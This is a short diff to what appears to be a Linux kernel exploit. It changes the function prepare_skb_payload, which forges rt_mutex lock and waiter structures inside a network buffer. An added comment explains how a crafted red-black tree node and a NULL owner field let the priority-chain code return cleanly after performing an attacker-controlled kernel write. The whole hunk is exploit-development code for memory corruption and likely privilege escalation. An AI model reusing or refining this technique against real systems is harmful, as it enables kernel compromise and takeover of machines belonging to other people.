@@ -588,9 +588,14 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x10, fake_w0);
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     } else {
+      /* NEW walk design: tree keeps crafted black node fake_w0 so the
+         post-write enqueue never updates rb_leftmost (no wake_up_process
+         on the overlaid W->task); owner = NULL makes rt_mutex_adjust_
+         prio_chain return right after rt_mutex_dequeue performed the
+         write.  See main.c overlay comment. */
       put64(p, LOCK_OFF + 0x08, fake_w0);
       put64(p, LOCK_OFF + 0x10, fake_w0);
-      put64(p, LOCK_OFF + 0x18, fake_task | 1);
+      put64(p, LOCK_OFF + 0x18, 0);
     }
 
     put64(p, W0_OFF + 0x00, 1);
